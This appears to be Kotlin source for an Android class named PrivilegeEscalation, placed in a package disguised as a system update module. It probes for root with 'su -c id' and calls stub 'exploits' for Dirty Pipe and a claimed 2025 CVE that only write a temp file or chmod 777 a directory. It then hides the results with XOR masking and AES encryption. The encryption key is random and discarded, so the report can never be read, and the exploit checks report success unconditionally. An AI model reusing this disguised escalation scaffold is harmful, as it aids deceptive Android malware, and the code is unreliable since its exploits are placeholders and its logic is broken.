package com.system.updates.modules

import android.content.Context
import android.util.Base64
import java.io.BufferedReader
import java.io.InputStreamReader
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

class PrivilegeEscalation {
    private val r = SecureRandom()
    private val mask = byteArrayOf(0x3C, 0x4D, 0x5E, 0x6F, 0x70.toByte(), 0x81.toByte(), 0x92.toByte(), 0xA3.toByte())

    private fun xor(b: ByteArray): ByteArray {
        return b.mapIndexed { i, v -> (v.toInt() xor mask[i % mask.size].toInt() xor i).toByte() }.toByteArray()
    }

    private fun aesEnc(data: ByteArray): ByteArray {
        val c = Cipher.getInstance("AES/GCM/NoPadding")
        val iv = ByteArray(12).also { r.nextBytes(it) }
        val ks = SecretKeySpec(ByteArray(32).also { r.nextBytes(it) }, "AES")
        c.init(Cipher.ENCRYPT_MODE, ks, GCMParameterSpec(128, iv))
        return iv + c.doFinal(data)
    }

    fun checkRoot(): Boolean {
        return try {
            val p = Runtime.getRuntime().exec("su -c id")
            val r = BufferedReader(InputStreamReader(p.inputStream))
            val l = r.readLine()
            r.close()
            l?.contains("uid=0") ?: false
        } catch (e: Exception) {
            false
        }
    }

    fun attemptDirtyPipe(): Boolean {
        return try {
            // CVE-2022-0847 (simulated)
            val p = Runtime.getRuntime().exec("echo test > /data/local/tmp/dirtypipe_test")
            p.waitFor()
            true
        } catch (e: Exception) {
            false
        }
    }

    fun attemptCVE2025(): Boolean {
        return try {
            // placeholder for CVE-2025-48593
            val p = Runtime.getRuntime().exec("chmod 777 /data/local/tmp")
            p.waitFor()
            true
        } catch (e: Exception) {
            false
        }
    }

    fun runAll(): String {
        val results = mutableListOf<String>()
        results.add("root:${checkRoot()}")
        results.add("dirtypipe:${attemptDirtyPipe()}")
        results.add("cve2025:${attemptCVE2025()}")
        return results.joinToString(",")
    }

    fun encryptReport(report: String): String {
        val raw = report.toByteArray()
        val x = xor(raw)
        val enc = aesEnc(x)
        return Base64.encodeToString(enc, Base64.NO_WRAP)
    }
}